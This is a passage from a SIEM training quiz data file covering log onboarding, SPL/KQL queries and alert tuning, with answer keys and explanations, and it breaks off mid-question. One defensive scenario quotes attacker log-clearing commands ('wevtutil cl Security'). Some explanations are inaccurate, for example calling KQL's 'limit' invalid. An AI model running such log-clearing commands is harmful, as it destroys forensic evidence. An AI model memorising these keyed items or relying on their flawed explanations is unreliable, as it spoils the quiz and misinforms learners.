          "Deploy agents where allowed for richer collection; use centralized rsyslog for holdouts and document visibility gaps."
        ],
        correctAnswer: 3,
        explanation: "Real environments are hybrid. Agents give you tailing of arbitrary files, metadata, and reliable buffering. Agentless syslog covers political holdouts but is limited to what the OS already emits. Document the gap so detection authors know which hosts CAN'T see Sysmon-equivalent data."
      },
      {
        id: "siem-q2-3",
        difficulty: "hard",
        tags: ["Cost Control", "Tiering"],
        scenario: "Your hot tier is at 95% and CFO wants 30% cost reduction. Audit shows 60% of ingest is DEBUG-level app logs that NO detection uses. Compliance requires keeping them for 1 year.",
        question: "Best approach?",
        options: [
          "Permanently delete all DEBUG-level application logs to immediately reclaim the storage space on the hot tier.",
          "Reduce all data retention across the board to 7 days to achieve the 30% cost reduction target immediately.",
          "Route DEBUG logs to a cheap data-lake (S3/ADLS) with cold-search; keep security-relevant levels in the SIEM hot tier.",
          "Migrate the entire SIEM deployment to a less expensive vendor platform to achieve the required budget reduction."
        ],
        correctAnswer: 2,
        explanation: "Tiered architecture (hot SIEM + cold data lake, e.g. Splunk Federated Search, Sentinel Basic Logs, Cribl, Chronicle) is the standard cost-control answer. Detection-relevant data stays fast; compliance/forensics data stays cheap but searchable."
      },
      {
        id: "siem-q2-4",
        difficulty: "medium",
        tags: ["AWS", "Cloud Logging"],
        scenario: "You're onboarding AWS. Available sources:\n  - CloudTrail (control-plane API calls)\n  - VPC Flow Logs (network 5-tuple)\n  - GuardDuty findings\n  - S3 server access logs",
        question: "Which is the FIRST priority for detection coverage of identity compromise (the #1 cloud risk)?",
        options: [
          "VPC Flow Logs — capture all network 5-tuple data to detect lateral movement and exfiltration across AWS.",
          "CloudTrail — every IAM action (AssumeRole, CreateUser, console login, key creation) is captured here.",
          "S3 server access logs — data exfiltration via object storage is the most common and highest-impact cloud risk.",
          "GuardDuty alone — AWS's built-in managed detection is sufficient to cover all identity-related cloud threats."
        ],
        correctAnswer: 1,
        explanation: "CloudTrail is the audit log of AWS. Identity-based attacks (compromised access keys, role assumption chains, persistence via new IAM users) are invisible without it. VPC Flow and S3 access are valuable but secondary. GuardDuty is signal, not raw evidence."
      },
      {
        id: "siem-q2-5",
        difficulty: "medium",
        tags: ["Tamper Resistance"],
        scenario: "An attacker with local admin on a Windows server runs:\n  wevtutil cl Security\n  wevtutil cl System\nThey then continue lateral movement.",
        question: "Why does your investigation still succeed?",
        options: [
          "Windows kernel enforces mandatory log integrity and refuses the wevtutil clear command on domain-joined systems.",
          "The wevtutil command only marks events as deleted but retains them in a shadow copy readable by forensic tools.",
          "Logs were forwarded to the SIEM in near-real-time before the clear; Event ID 1102 is itself a high-fidelity detection.",
          "Windows automatically rolls back log-clearing commands and restores the deleted events from a protected backup."
        ],
        correctAnswer: 2,
        explanation: "This is the entire reason we ship logs OFF the endpoint. Local logs are at the attacker's mercy; centralized SIEM copies are not. Event 1102 / 4 (log cleared) is also one of the strongest 'someone is hiding tracks' signals — alert on it with high severity."
      },
      {
        id: "siem-q2-6",
        difficulty: "hard",
        tags: ["Schema Drift", "Detection Reliability"],
        scenario: "A vendor renames a field across all events:\n  user_name → userName\nYour 47 detections referencing user_name silently stop matching. No alerts. No errors.",
        question: "What engineering practice prevents this?",
        options: [
          "Trust the vendor's update schedule and assume any field renames will be communicated via release notes on time.",
          "Schema contract tests: automated validators asserting fields exist with cardinality, plus a normalization layer for canonical names.",
          "Assign one analyst per week to manually re-check every production rule and verify field names against live data.",
          "Stop using that vendor and migrate to another provider whose data schema is guaranteed to never change fields."
        ],
        correctAnswer: 1,
        explanation: "Silent schema drift is one of the top causes of broken detection. Mitigations: (1) normalize to CIM/ECS so detections reference stable canonical fields, (2) automated 'field exists and is populated' health checks, (3) detection unit tests in CI."
      },
      {
        id: "siem-q2-7",
        difficulty: "medium",
        tags: ["EDR Integration"],
        scenario: "You onboard CrowdStrike via FDR (Falcon Data Replicator) into the SIEM. After two weeks, indexers are at 90% disk. EDR alone is 4 TB/day — half your total ingest.",
        question: "Smartest tuning approach?",
        options: [
          "Stop ingesting all EDR telemetry immediately to recover the disk space and prevent further storage overrun.",
          "Filter at the source: drop low-value DNS and innocuous process telemetry unused in detection, preserve detection EIDs.",
          "Buy additional disk capacity as needed each month to accommodate any future increases in EDR telemetry volume.",
          "Randomly sample 50% of all incoming EDR events to cut ingest volume while maintaining statistical coverage."
        ],
        correctAnswer: 1,
        explanation: "Edge filtering (Cribl, Splunk ingest actions, Logstash) is the right scalpel. Random sampling (D) breaks correlation. The discipline: every drop rule is reviewed by detection engineering AND logged in a 'what we don't ingest' register so future authors aren't blindsided."
      },
      {
        id: "siem-q2-8",
        difficulty: "easy",
        tags: ["CEF", "Standards"],
        scenario: "Three vendors ship logs in CEF (Common Event Format).",
        question: "Why does CEF matter to a SIEM team?",
        options: [
          "CEF is an encrypted transport protocol that ensures log integrity and prevents tampering during transmission.",
          "CEF is a mandatory GDPR compliance standard required for all security log collection in regulated environments.",
          "CEF defines a predictable header + key=value structure, enabling write-once parsers and clean CIM/ASIM normalization.",
          "CEF is a proprietary vendor format that locks organizations into a single SIEM ecosystem for log processing."
        ],
        correctAnswer: 2,
        explanation: "CEF (and LEEF for QRadar) reduces onboarding cost dramatically — predictable structure means write-once parsers and consistent field naming. It's the closest the industry has to a 'common security log dialect.'"
      },
      {
        id: "siem-q2-9",
        difficulty: "hard",
        tags: ["Pipeline", "Cribl/Edge Routing"],
        scenario: "You introduce an observability pipeline (Cribl) between sources and your SIEM. The architect proposes routing FULL fidelity to a cold lake and only HIGH-VALUE events to the hot SIEM.",
        question: "Main risk and how to mitigate?",
        options: [
          "Risk: a detection event is dropped from the hot path and never fires. Mitigation: inventory required events, version routing rules, run coverage diffs.",
          "No significant risk exists with this design pattern; ship the routing change to production without additional review.",
          "Risk: the pipeline introduces latency that makes Cribl too fast for real-time correlation windows to process.",
          "Risk: the cold data lake will inevitably cost more than the hot SIEM tier, eliminating all expected cost savings."
        ],
        correctAnswer: 0,
        explanation: "Pipelines are powerful but become a hidden detection layer. Treat routing rules as code: PR review, change diff vs the detection library, dev-tier replay, and a rollback plan. Otherwise a 'cost optimization' silently kills alerts."
      },
      {
        id: "siem-q2-10",
        difficulty: "medium",
        tags: ["Identity"],
        scenario: "Onboarding Azure AD sign-in logs. The detection team wants to write 'impossible travel' and 'risky sign-in' rules.",
        question: "Which Azure AD log streams are required at minimum?",
        options: [
          "SigninLogs (interactive + non-interactive), IdentityRiskEvents for ID Protection, and Audit logs for directory changes.",
          "Only Audit logs — Audit logs contain all authentication and directory change events needed for identity detections.",
          "Only the Azure Monitor activity log — it captures all sign-in attempts across the entire Azure AD tenant.",
          "Only Microsoft Defender for Identity alerts — managed detection handles all identity-based threat scenarios."
        ],
        correctAnswer: 0,
        explanation: "SigninLogs carry the who/where/how of authentication; non-interactive sign-ins are where token replay and refresh-token abuse hide. IdentityRiskEvents add Microsoft's risk scoring. Audit logs cover the persistence side (new app registrations, role assignments)."
      },
      {
        id: "siem-q2-11",
        difficulty: "medium",
        tags: ["Lookups", "Asset Context"],
        scenario: "Alerts say 'login from 10.4.7.22'. Analysts have no idea if that's a printer, a domain controller, or a CFO laptop.",
        question: "What's the standard fix?",
        options: [
          "Require all Tier 1 analysts to memorize the IP address plan and subnet assignments in the enterprise network diagram.",
          "Stop using internal RFC1918 addresses in alerts and replace all IP fields with a hash digest for anonymization.",
          "Ignore all alerts from internal source IPs as they can be assumed to be lower-priority internal management traffic.",
          "Maintain a CMDB-sourced asset lookup table in the SIEM keyed on IP/hostname, enriching every alert with context."
        ],
        correctAnswer: 3,
        explanation: "Asset context turns a noisy alert into a prioritizable one. Splunk ES Asset & Identity Framework, Sentinel Watchlists, QRadar Reference Data — every mature SIEM has this. Refresh the lookup nightly from the CMDB."
      },
      {
        id: "siem-q2-12",
        difficulty: "hard",
        tags: ["Late-Arriving Data"],
        scenario: "A cloud connector batches events and delivers them 45 minutes late. Your near-real-time correlation rule (5-minute window) NEVER fires on these events even when the pattern is clearly present.",
        question: "Root cause and correct redesign?",
        options: [
          "The correlation logic is incorrect; rewrite the rule with a different detection algorithm to handle batch delivery.",
          "Increase the rule's severity level from medium to critical, which will force the platform to process late events first.",
          "Real-time windows use ingest time, but events arrive 45 min late on event time and fall outside the window; switch to scheduled batch search.",
          "Drop the late-arriving source from the SIEM and rely on GuardDuty to compensate for the missing cloud coverage."
        ],
        correctAnswer: 2,
        explanation: "Event-time vs ingest-time is a classic gotcha. Real-time stream correlation can't see the past. For lagged sources, use scheduled/batch detections with a window that brackets typical lag (e.g. last 60 min, every 10 min) or platform features like Sentinel's near-real-time analytics with appropriate lookback."
      },
      {
        id: "siem-q2-13",
        difficulty: "medium",
        tags: ["DNS"],
        scenario: "You're choosing what DNS telemetry to onboard. Options: (a) DNS server query logs, (b) endpoint DNS (Sysmon EID 22 / EDR), (c) passive DNS at the resolver.",
        question: "For detecting C2 beacons and DGA traffic from a single endpoint, what's the highest-fidelity source?",
        options: [
          "Passive DNS at the resolver — aggregated org-wide view provides the broadest coverage across all endpoints.",
          "DNS server query logs — the authoritative server has the most complete record of all queries in the environment.",
          "DHCP logs — lease assignments link IP addresses to hostnames, indirectly identifying which host made the query.",
          "Endpoint DNS via Sysmon EID 22 or EDR — attributes each query to the exact process and host making it."
        ],
        correctAnswer: 3,
        explanation: "Server/resolver DNS knows the host but not the process. Endpoint DNS attributes the query to the specific process making it — essential for proving 'powershell.exe queried evil.com' rather than 'something on host01 did.' Best practice: collect both."
      },
      {
        id: "siem-q2-14",
        difficulty: "hard",
        tags: ["Detection Reliability", "Testing"],
        scenario: "You're proposing a 'detection-as-code' workflow: rules live in Git, PRs run automated tests, deployment via CI.",
        question: "Which test type catches the MOST production breakage cheaply?",
        options: [
          "Replay tests: run known-malicious and known-benign events through the full parser+detection pipeline in CI to catch regressions.",
          "Lint YAML/Sigma syntax only — catching schema violations early prevents the majority of production failures.",
          "Manual peer review for all PRs — human review catches logical errors that automated tests consistently miss.",
          "Monitor alerts in production only after deployment and roll back if the rule fires unexpectedly on benign data."
        ],
        correctAnswer: 0,
        explanation: "Replay/'fixture' tests are the industry's highest-ROI safeguard — they catch parser drift, field renames, AND logic regressions in one shot. Linting catches syntax. Peer review and prod monitoring matter but don't substitute for objective behavioral tests."
      },
      {
        id: "siem-q2-15",
        difficulty: "medium",
        tags: ["Compliance", "PCI/GDPR"],
        scenario: "Compliance asks: 'Can you prove logs were not tampered with between source and SIEM?'",
        question: "Strongest technical answer?",
        options: [
          "Informally assure the auditor that internal processes and trusted staff make tampering practically impossible.",
          "Lock the physical server room hosting the SIEM infrastructure and restrict key-card access to the security team.",
          "Create a monthly tape backup of raw log files that can be compared against the SIEM data upon request.",
          "TLS in transit + WORM/immutable storage + admin role audit trail on all SIEM access, combined with source-side log signing."
        ],
        correctAnswer: 3,
        explanation: "PCI/SOX/GDPR ask about integrity and access control. The defensible answer chains: transport encryption, immutable storage (S3 Object Lock, Splunk frozen WORM, Azure immutable blobs), and admin auditing — so any tamper attempt is detectable AND attributable."
      }
    ]
  },
  {
    quizId: "siem-q3",
    courseId: "siem-fundamentals",
    title: "SPL & KQL in the Trenches",
    description: "Hands-on scenario quiz: write and read the queries you'll use every shift.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "siem-q3-1",
        difficulty: "medium",
        tags: ["SPL", "Brute Force"],
        scenario: "Investigating a possible brute force against Windows accounts in the last hour. You want: top 10 (user, src_ip) pairs by failed logon count, only pairs with ≥ 20 failures.",
        question: "Which SPL is correct?",
        options: [
          "index=wineventlog EventCode=4624 earliest=-1h | stats count by user src_ip | where count>=20 | sort -count | head 10",
          "index=wineventlog EventCode=4625 | stats values(user) by src_ip | where count>=20 | sort -count | head 10",
          "index=wineventlog EventCode=4625 earliest=-1h | stats count by user src_ip | where count>=20 | sort -count | head 10",
          "index=* EventCode=4625 earliest=-1h | stats count by user src_ip | filter count>=20 | limit 10"
        ],
        correctAnswer: 2,
        explanation: "The correct SPL (C) filters for EventCode 4625 (failed logon) within the last hour, aggregates by user and src_ip, filters for count >= 20, sorts descending, and returns the top 10. (A) uses 4624 (success). (B) lacks the time filter. (D) uses invalid 'filter' and 'limit' commands."
      },
      {
        id: "siem-q3-2",
        difficulty: "medium",
        tags: ["KQL", "Sentinel", "Impossible Travel"],
        scenario: "Sentinel — for each user in the last 24h, you want the count of DISTINCT countries they signed in from, surfacing users with > 2 countries.",
        question: "Which KQL is correct?",
        options: [
          "SigninLogs | where TimeGenerated > ago(24h) | summarize Countries = dcount(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
          "SigninLogs | summarize Countries = dcount(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
          "SigninLogs | where TimeGenerated > ago(24h) | summarize Countries = count(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
          "SigninLogs | project UserPrincipalName, LocationDetails.countryOrRegion | distinct LocationDetails.countryOrRegion | where count() > 2"
        ],
        correctAnswer: 0,
        explanation: "The correct KQL (A) applies a time filter first to limit scanned volume, aggregates by the distinct count of countries (dcount), and filters for counts > 2. (B) lacks the critical 24h time filter. (C) uses non-distinct count. (D) is syntactically invalid."
      },
      {
        id: "siem-q3-3",
        difficulty: "hard",
        tags: ["SPL", "Performance"],
        scenario: "A search is slow:\n  index=* sourcetype=* user=jdoe earliest=-7d | stats count\nDaily ingest is 5 TB across 40 sourcetypes; jdoe appears in only 2 of them.",
        question: "Biggest single performance win?",
        options: [
          "Run the search daily at midnight during low-utilization windows and output the aggregated results to a lookup table.",
          "Replace index=* sourcetype=* with specific indexes and sourcetypes where the user field is a schema-extracted field.",
          "Append the '| head 1' command to the end of the query to stop indexer disk scanning immediately after the first match.",
          "Append the '| fields user count' command right after the index and sourcetype search terms to reduce search memory footprint."
        ],
        correctAnswer: 1,
        explanation: "Pruning search buckets by specifying indexes and sourcetypes (B) yields the biggest performance win by limiting raw disk I/O. (A) doesn't optimize the search itself. (C) and (D) process all data before filtering or limiting."
      },
      {
        id: "siem-q3-4",
        difficulty: "medium",
        tags: ["KQL", "join"],
        scenario: "You need to find users who had a failed sign-in AND a successful sign-in from the SAME IP within 10 minutes (brute-force success).",
        question: "Which KQL pattern is appropriate?",
        options: [
          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName, IPAddress | where Failed > 1",
          "SigninLogs | project UserPrincipalName, IPAddress, ResultType | distinct UserPrincipalName, IPAddress",
          "Two separate searches displayed on a dashboard side-by-side, requiring the analyst to manually eyeball matching IPs.",
          "SigninLogs | where ResultType != 0 | project user=UserPrincipalName, ip=IPAddress, failTime=TimeGenerated | join kind=inner (SigninLogs | where ResultType == 0 | project user=UserPrincipalName, ip=IPAddress, successTime=TimeGenerated) on user, ip | where successTime between (failTime .. failTime + 10m)"
        ],
        correctAnswer: 3,
        explanation: "An inner join on user and IPAddress, followed by a time window predicate (D), correlates failures and successes. (A) and (B) do not establish sequence or time correlation. (C) is inefficient and manual."
      },
      {
        id: "siem-q3-5",
        difficulty: "hard",
        tags: ["SPL", "Stats vs Transaction"],
        scenario: "You want to group all events of a user session (logon → activity → logoff) and compute session duration.",
        question: "Which approach scales better on a 50 GB/day index?",
        options: [
          "stats with min(_time) and max(_time) by session_key (e.g., LogonID), then eval duration = max - min",
          "transaction user maxspan=8h startswith=eval(EventCode=4624) endswith=eval(EventCode=4634)",
          "Run a map command to execute a subsearch for each individual user session to compute durations sequentially",
          "Use index=wineventlog | streamstats window=2 current=f values(_time) as prev_time | eval duration = _time - prev_time"
        ],
        correctAnswer: 0,
        explanation: "The 'stats' command (A) is distributable across search peers and uses far less memory than 'transaction' (B), which groups events on a single search head and does not scale well on large datasets."
      },
      {
        id: "siem-q3-6",
        difficulty: "easy",
        tags: ["SPL"],
        scenario: "You write:\n  index=web | stats count by status\nresult shows just '200, 301, 404'. Your colleague wants the count visible too in a clean table.",
        question: "Minimal correct addition?",
        options: [
          "Append the '| chart count by status' command to dynamically group and display counts in a horizontal bar graph.",
          "Append the '| sort status' command to order the existing results alphabetically by status value.",
          "Append the '| table status count' command to explicitly specify the column layout and display both fields.",
          "Append the '| eval count=1' command to assign a static value to the count field for table visualization."
        ],
        correctAnswer: 2,
        explanation: "The 'table' command (C) selects and formats the columns for display in the UI. (A) changes visualization format rather than simple table layout. (B) only reorders rows. (D) overwrites the aggregated count."
      },
      {
        id: "siem-q3-7",
        difficulty: "medium",
        tags: ["KQL", "Time"],
        scenario: "You want sign-ins from the last 7 days, bucketed by HOUR, separated by Result (Success/Failure), for a time-series chart.",
        question: "Correct KQL?",
        options: [
          "SigninLogs | where TimeGenerated > ago(7d) | project TimeGenerated, ResultType | summarize count() by bin(TimeGenerated, 1h)",
          "SigninLogs | summarize Count = count() by bin(TimeGenerated, 1h), Result = iff(ResultType == 0, 'Success', 'Failure')",
          "SigninLogs | where TimeGenerated > ago(7d) | summarize Count = count() by bin(TimeGenerated, 1h), Result = iff(ResultType == 0, 'Success', 'Failure') | render timechart",
          "SigninLogs | where TimeGenerated > now() | summarize Count = count() by bin(TimeGenerated, 1h) | render timechart"
        ],
        correctAnswer: 2,
        explanation: "Using 'bin' for 1-hour intervals, 'iff' to label success/failure, and 'render timechart' (C) creates the time-series chart. (A) lacks the result splitter and timechart rendering. (B) lacks the time filter. (D) uses an invalid future time boundary."
      },
      {
        id: "siem-q3-8",
        difficulty: "hard",
        tags: ["SPL", "Lookups", "Enrichment"],
        scenario: "You maintain a CSV lookup 'threat_ips.csv' with columns ip, score, source. You want to enrich every proxy event with the threat score and filter to score > 80.",
        question: "Correct SPL?",
        options: [
          "index=proxy | join ip [search inputlookup threat_ips.csv] | where score > 80",
          "index=proxy | lookup threat_ips.csv ip OUTPUT score source | where score > 80",
          "index=proxy AND [| inputlookup threat_ips.csv | where score > 80 | fields ip]",
          "index=proxy | inputlookup threat_ips.csv append=true | where score > 80"
        ],
        correctAnswer: 1,
        explanation: "The 'lookup' command (B) efficiently enriches events in-flight using lookup tables. (A) is slow and memory-intensive due to join limitations. (C) uses subsearches incorrectly. (D) appends lookup data as separate events."
      },
      {
        id: "siem-q3-9",
        difficulty: "medium",
        tags: ["KQL", "extend/project"],
        scenario: "You need to compute a derived field RiskTag = 'high' when failed sign-ins > 50 else 'low', per user.",
        question: "Which KQL is right?",
        options: [
          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName | where Failed > 50",
          "SigninLogs | summarize Failed = countif(ResultType != 0) by UserPrincipalName | project UserPrincipalName, RiskTag = 'high'",
          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName | extend RiskTag = iff(Failed > 50, 'high', 'low')",
          "SigninLogs | extend RiskTag = iff(count() > 50, 'high', 'low') by UserPrincipalName"
        ],
        correctAnswer: 2,
        explanation: "First filter to failures and aggregate count by user, then use 'extend' with 'iff' to assign the conditional tag (C). (A) filters out 'low' risk users completely. (B) tags all users as high risk. (D) is syntactically invalid."
      },
      {
        id: "siem-q3-10",
        difficulty: "hard",
        tags: ["SPL", "Anomaly"],
        scenario: "You want to detect users whose data egress today is anomalously high vs their own 14-day baseline (z-score > 3).",
        question: "Which SPL approach is correct?",
        options: [
          "Build a 14-day per-user baseline with stats avg, stdev; outer-join today's per-user sum; compute z = (today - avg) / stdev; alert where z > 3.",
          "Calculate the overall daily network egress average across the whole company, and alert on any user exceeding 10 GB.",
          "Run a daily search for the top 10 users by bytes transferred, and automatically block their network access.",
          "Compare today's data egress against yesterday's egress for each user and alert if the difference is greater than 50%."
        ],
        correctAnswer: 0,
        explanation: "Using standard deviation and mean on a per-user historical baseline (A) accounts for individual baseline variability. Static global thresholds (B) generate false positives for high-throughput roles, and top 10 reports (C) aren't behavioral baselines."
      },
      {
        id: "siem-q3-11",
        difficulty: "medium",
        tags: ["SPL", "Subsearch"],
        scenario: "You want all events from src_ip values that already triggered the 'high-risk' alert today (a small set — < 100 IPs).",
        question: "Which is correct AND efficient?",
        options: [
          "index=network | join src_ip [search index=alerts severity=high earliest=@d | fields src_ip]",
          "index=network [search index=alerts severity=high earliest=@d | fields src_ip] | stats count by src_ip",
          "index=network | where src_ip IN (search index=alerts severity=high earliest=@d | project src_ip)",
          "index=network [search index=alerts severity=high earliest=@d | stats values(src_ip) AS src_ip | table src_ip]"
        ],
        correctAnswer: 3,
        explanation: "A subsearch returning a list of IPs (D) acts as an efficient inline filter at search start. (A) uses join which is slow. (B) performs an unnecessary stats aggregation. (C) uses invalid KQL-like syntax in Splunk."
      },
      {
        id: "siem-q3-12",
        difficulty: "easy",
        tags: ["KQL"],
        scenario: "You want to limit a noisy KQL query to the 20 most recent rows for quick inspection.",
        question: "Which is correct?",
        options: [
          "SigninLogs | limit 20",
          "SigninLogs | top 20 by TimeGenerated desc",
          "SigninLogs | take 20",
          "SigninLogs | head 20"
        ],
        correctAnswer: 1,
        explanation: "Using 'top 20 by TimeGenerated desc' (B) explicitly sorts and retrieves the 20 most recent records. (C) retrieves 20 arbitrary, non-guaranteed records. (A) and (D) are Splunk commands, not valid KQL."
      },
      {
        id: "siem-q3-13",
        difficulty: "medium",
        tags: ["SPL", "Regex"],
        scenario: "URLs are buried in proxy raw events. You want a field 'domain' extracted in-flight without an admin-side parser change.",
        question: "Which SPL works?",
        options: [
          "index=proxy | eval domain = mvindex(split(url, \"/\"), 2)",
          "index=proxy | spath input=url output=domain",
          "index=proxy | rex field=_raw \"https?://(?<domain>[^/]+)\"",
          "index=proxy | extract domain from url"
        ],
        correctAnswer: 2,
        explanation: "The 'rex' command (C) extracts fields from raw data or existing fields using regular expressions. (A) is brittle and fails on complex URLs. (B) is for JSON/XML parsing. (D) is syntactically invalid."
      },
      {
        id: "siem-q3-14",
        difficulty: "hard",
        tags: ["KQL", "Performance"],
        scenario: "A KQL query over 30 days of SecurityEvent times out. You really need 30 days.",
        question: "Best optimization path?",
        options: [
          "Narrow at the source: project away unused columns early, apply filters first, and use materialized views or hourly summaries.",
          "Run the query during non-business hours and increase the Sentinel query timeout limit to 8 hours.",
          "Export the raw data to a local CSV file and perform the aggregation using a Python script.",
          "Split the query into 30 individual daily queries and manually merge the results in Excel."
        ],
        correctAnswer: 0,
        explanation: "Applying filters early, projecting only necessary columns, and using pre-aggregated data (A) are the best practices for large KQL queries. (B) and (D) are operational bypasses, and (C) is inefficient."
      },
      {
        id: "siem-q3-15",
        difficulty: "hard",
        tags: ["SPL", "Detection"],
        scenario: "You want: 'Service account whose number of distinct destination hosts in 1h > 5x its 7-day median' (lateral-movement signal).",
        question: "Sketch the SPL pattern.",
        options: [
          "index=auth account_type=service earliest=-1h | stats dc(dest_host) AS hosts_1h by user | where hosts_1h > 5",
          "index=auth account_type=service | stats dc(dest_host) as unique_hosts by user | eventstats avg(unique_hosts) as avg_hosts",
          "index=auth account_type=service earliest=-1h | stats dc(dest_host) AS hosts_1h by user | join user [search index=auth account_type=service earliest=-7d@d latest=@d | bucket _time span=1h | stats dc(dest_host) AS h by user _time | stats median(h) AS median_hosts by user] | where hosts_1h > 5 * median_hosts",
          "index=auth | stats count by user dest_host | eventstats median(count) as med by user | where count > 5 * med"
        ],
        correctAnswer: 2,
        explanation: "The correct SPL (C) calculates the current 1h window host count, runs a subsearch over the last 7 days to calculate the 1h median per user, joins them, and checks if the current count exceeds 5x the median."
      },
      {
        id: "siem-q3-16",
        difficulty: "medium",
        tags: ["KQL", "let / functions"],
        scenario: "You repeat the same 'risky user list' subquery in five Sentinel rules.",
        question: "Cleanest way to centralize?",
        options: [
          "Maintain a static list of hardcoded usernames within each of the five Sentinel rules and update them weekly.",
          "Save the subquery as a saved KQL function; each rule calls the function, maintaining the definition in one place.",
          "Duplicate the subquery logic across all rules and document the copy-paste procedure in the team runbook.",
          "Disable four of the rules and rely on a single consolidated rule that alerts on any activity from the user list."
        ],
        correctAnswer: 1,
        explanation: "KQL functions promote DRY (Don't Repeat Yourself) design (B). Centralizing the subquery in a function ensures that updates propagate automatically. Hardcoding (A) or copying (C) introduces drift and maintenance overhead."
      },
      {
        id: "siem-q3-17",
        difficulty: "easy",
        tags: ["SPL"],
        scenario: "Your SPL: index=web | stats count by status. You want descending sort by count.",
        question: "Correct addition?",
        options: [
          "index=web | stats count by status | order count desc",
          "index=web | stats count by status | sort -count",
          "index=web | stats count by status | sort count",
          "index=web | stats count by status | desc count"
        ],
        correctAnswer: 1,
        explanation: "The '-' prefix in Splunk's 'sort' command (B) sorts the specified field in descending order. (A) uses invalid 'order' command. (C) sorts in ascending order. (D) is invalid syntax."
      },
      {
        id: "siem-q3-18",
        difficulty: "hard",
        tags: ["SPL", "tstats"],
        scenario: "You need a fast count of distinct src_ip per hour over 30 days for a dashboard.",
        question: "Which is dramatically faster?",
        options: [
          "| tstats summariesonly=true dc(All_Traffic.src) FROM datamodel=Network_Traffic.All_Traffic BY _time span=1h",
          "index=fw | stats dc(src_ip) by date_hour | addtotals",
          "index=fw | bucket _time span=1h | stats dc(src_ip) by _time",
          "| metasearch index=fw | bucket _time span=1h | stats dc(src_ip) by _time"
        ],
        correctAnswer: 0,
        explanation: "The 'tstats' command (A) queries accelerated datamodels directly rather than raw indexes, providing orders-of-magnitude speedups on large datasets. (B) and (C) scan raw events, which is slow over 30 days."
      },
      {
        id: "siem-q3-19",
        difficulty: "medium",
        tags: ["KQL", "parse"],
        scenario: "A free-text Message field contains:\n  \"User jdoe logged in from 10.4.7.22 (session 9c1f)\"\nYou want extracted columns user, ip, session.",
        question: "Which KQL operator fits?",
        options: [
          "| rex field=Message \"User (?<user>\\w+) logged in from (?<ip>[\\d.]+) \\(session (?<session>\\w+)\\)\"",
          "| extend user = extract(\"User (\\w+)\", Message), ip = extract(\"from ([\\d.]+)\", Message)",
          "| project Message | parse-text Message into user, ip, session",
          "| parse Message with 'User ' user ' logged in from ' ip ' (session ' session ')'"
        ],
        correctAnswer: 3,
        explanation: "The 'parse' operator in KQL (D) extracts structured columns from unstructured strings using a pattern template. (A) is Splunk SPL syntax. (B) uses invalid KQL syntax. (C) is invalid."
      },
      {
        id: "siem-q3-20",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "Final check before promoting a new rule to prod: it fires 3 times in the last 24h of test data — all 3 are true positives in your sample.",
        question: "Is it ready?",
        options: [
          "Run a backtest against 24 hours of logs, confirm a 100% precision rate, and deploy immediately to production.",
          "Deploy the rule in monitor-only mode and alert the on-call team for every execution to test response times.",
          "Submit the query directly to the production SIEM alert library and schedule a review in six months.",
          "Run it against ≥ 30 days of production telemetry, measure the alert rate, document a runbook, and deploy in monitor-only/staging mode."
        ],
        correctAnswer: 3,
        explanation: "Deploying a detection requires testing against historical data (D) (to assess volume and false-positive rates), creating a runbook, and staging in monitor-only/silent mode to ensure stability before going live."
      }
    ]
  },
  {
    quizId: "siem-q4",
    courseId: "siem-fundamentals",
    title: "Alert Tuning & Detection Quality",
    description: "Scenario quiz on building, tuning, and operating high-fidelity detections.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q4-1",
        difficulty: "medium",
        tags: ["FP Reduction"],
        scenario: "Rule 'Multiple Failed Logons' fires 1,200x/day. Triage shows: 95% from a vuln scanner (known IP), 4% from a misconfigured backup agent (known account), <1% true positives.",
        question: "What is the most effective tuning approach to reduce volume while maintaining visibility?",
        options: [
          "Disable the alerting rule entirely across all subnets until the scanner and backup agent configurations are fully resolved.",
          "Add explicit exceptions for known sources, document owners, and review dates so actual brute-force attempts still trigger.",
          "Increase the rule threshold to 10,000 alerts per day to silence the scanner noise while keeping the rule active.",
          "Instruct the SOC analyst team to manually mark scanner alerts as benign false positives at the end of each shift."
        ],
        correctAnswer: 1,
        explanation: "Targeted suppression of known-benign sources (B) reduces volume without creating blind spots. Disabling rules (A) or ignoring alerts (D) leaves the organization unprotected. Raising thresholds (C) blindly masks actual attacks."
      },
      {
        id: "siem-q4-2",
        difficulty: "hard",
        tags: ["Detection Lifecycle"],
        scenario: "Your detection library has 412 rules. 60% of them have not fired in 12 months. The team debates: 'kill the silent ones' vs 'they're insurance, keep them.'",
        question: "How should you evaluate these dormant detection rules?",
        options: [
          "Retain all 412 rules permanently, as any deletion risks creating critical gaps in threat detection coverage.",
          "Delete all rules that have not fired in the last year to optimize search performance and reduce SIEM workload.",
          "Perform a triage audit checking for log ingestion, semantic logic correctness, and threat relevance before deciding whether to retire them.",
          "Deactivate half of the silent rules at random and monitor the environment for any new undetected threat activity."
        ],
        correctAnswer: 2,
        explanation: "A structured audit (C) confirms whether silence is due to lack of attacks, broken log collection, or parser errors. Bulk retention (A) hides broken rules, and bulk deletion (B) or random disabling (D) creates unmeasured gaps."
      },
      {
        id: "siem-q4-3",
        difficulty: "medium",
        tags: ["Severity"],
        scenario: "A new rule 'PowerShell EncodedCommand executed' fires on every admin script (mostly benign) AND on real attacker tradecraft.",
        question: "How do you handle this noise without losing critical alerts?",
        options: [
          "Implement risk-based scoring to escalate severity dynamically only when correlated with high-risk signals or sensitive assets.",
          "Apply a critical severity level to ensure the SOC analyst team is immediately paged for every single alert execution.",
          "Permanently disable the rule to eliminate the false-positive volume and rely on endpoint antivirus alerts instead.",
          "Email all daily alert logs directly to the SOC manager's inbox for weekly manual review and correlation."
        ],
        correctAnswer: 0,
        explanation: "Risk-based alerting (A) combines low-fidelity signals with contextual risk scores (e.g., asset value, concurrent alerts) before paging. Constant paging (B) causes fatigue, disabling (C) misses attacks, and emails (D) delay response."
      },
      {
        id: "siem-q4-4",
        difficulty: "medium",
        tags: ["Throttling"],
        scenario: "Same rule fires 400 times in 10 minutes from the SAME src_ip during an obvious scan. Your on-call gets 400 pages.",
        question: "What is the best mechanism to handle this alert storm?",
        options: [
